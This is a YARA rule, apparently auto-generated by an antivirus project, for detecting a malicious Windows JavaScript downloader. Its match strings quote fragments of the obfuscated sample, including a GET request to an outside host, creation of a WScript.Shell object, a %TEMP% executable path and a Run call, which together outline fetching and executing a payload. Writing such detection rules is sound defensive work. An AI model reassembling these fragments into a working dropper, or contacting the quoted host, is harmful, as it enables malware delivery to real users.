rule sig_20160330_4e9048169d66b9d75abc1e385430dbc9 {
  meta:
    description = "datamaliciousorder - file 20160330_4e9048169d66b9d75abc1e385430dbc9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b61c63b84a083a2d3907529edb1c9fbc965709ad69c4a018fba514323cdc4d70"

  strings:
    $s1  = "_L0[_Q](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "function _Y(_R, _BI){_LI = _LI * 1; return _R - _BI;};" fullword ascii
    $s3  = "var _N = function _PB() {return WScript[_G](\"WScript\"+\".Shell\");}(), _D = 11;" fullword ascii
    $s4  = "if (_L0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _AN(){return _I + \"\";};" fullword ascii
    $s6  = "function _CF() {return _N[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rRkkVyvDVbLA.ex\" + \"e\";};" fullword ascii
    $s7  = "function _XN() {return ((_ZO == true) && (_ZO == _U)) ? 1 : _LI;};" fullword ascii
    $s8  = "function _E(_F){_N[\"Run\"](_F, _LI, _LI);};" fullword ascii
    $s9  = " while (_J){" fullword ascii
    $s10 = "function _C(_S) {var _L = (1, 2, 3, 4, 5, _S); return _L;};" fullword ascii
    $s11 = "function _CU(){return _G;};" fullword ascii
    $s12 = "function _FS(){return 22;};" fullword ascii
    $s13 = "var _SH = new this[\"Date\"]();" fullword ascii
    $s14 = "function _CD()" fullword ascii
    $s15 = "return _Y(_ZX, _QD);" fullword ascii
    $s16 = "var _U = false;" fullword ascii
    $s17 = "var _F0 = false;" fullword ascii
    $s18 = "var _ZO = false;" fullword ascii
    $s19 = "_U = true; " fullword ascii
    $s20 = "_ZO = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}